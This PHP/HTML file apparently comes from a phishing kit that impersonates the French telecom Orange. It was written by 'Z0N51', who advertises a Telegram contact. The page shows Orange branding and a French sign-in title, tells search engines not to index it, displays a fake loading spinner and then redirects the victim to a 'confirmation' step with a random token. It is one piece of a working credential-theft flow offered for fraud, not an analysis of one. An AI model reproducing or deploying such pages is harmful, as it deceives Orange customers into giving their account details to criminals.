<?php

/*******
    Main Author : Z0N51
    Contact me on telegram : https://t.me/Z0N51
    ********************************************************/

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html style="background-color: #EEEEEE;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body style="background-color: #EEEEEE;">

        <!-- HEADER -->
        <header id="header2">
            <div class="container">
                <img src="../assets/images/orange.png"> Orange
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main2">
            <div class="container">
                
                <!--<div class="logos mt20 mb20">
                    <div class="left"><img src="../assets/images/lock.png"> 100% sécurisé</div>
                    <div class="right"><img src="../assets/images/security.png"></div>
                </div>-->

                <div class="details-box">
                    <div class="loader">
                        <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    </div>
                </div>

                <div class="btns">
                    <p><i class="fas fa-angle-left"></i> Retour à l'étape précédente</p>
                    <button type="submit">Confirmer</button>
                </div>

            </div>  
        </main>
        <!-- END MAIN -->
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'ss.php?confirmation#_'+ dispatch;
            },3000); // 1000 = 1s
        </script>

    </body>

</html>